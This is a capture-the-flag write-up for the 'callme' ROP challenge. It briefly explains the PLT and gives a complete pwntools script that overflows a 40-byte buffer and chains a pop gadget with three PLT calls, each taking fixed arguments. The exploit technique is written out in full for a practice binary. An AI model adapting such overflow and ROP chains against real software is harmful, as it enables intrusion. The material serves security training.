# Challenge Theory and Solution
This is a basic rop challenge, but the attacker has to call a specific set of functions from within the plt.
The plt basically gives a set of addresses where you can find the function.
This is because it enables functions being lazy loaded into memory.
This can also be used for rop chains.
The functions also have to be called with a set of arguments, but this is not really that important.
## Solve Script with Rop Chain
```python
#!/usr/bin/python3
import pwn
import sys
binary = "callme"
pwn.context.binary = binary
pwn.context.encoding = "latin"

padding = 40
gadget_triple_pop = pwn.p64(0x40093c)
gadget_callme_one = pwn.p64(0x400720)
gadget_callme_two = pwn.p64(0x400740)
gadget_callme_three = pwn.p64(0x4006f0)
arg_1 = pwn.p64(0xdeadbeefdeadbeef)
arg_2 = pwn.p64(0xcafebabecafebabe)
arg_3 = pwn.p64(0xd00df00dd00df00d)
payload = b"A"*40 + gadget_triple_pop + arg_1 + arg_2 + arg_3 + gadget_callme_one + gadget_triple_pop + arg_1 + arg_2 + arg_3 + gadget_callme_two + gadget_triple_pop + arg_1 + arg_2 + arg_3 + gadget_callme_three

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))
    io.send(payload)
    pwn.info(io.readrepeat(1))
```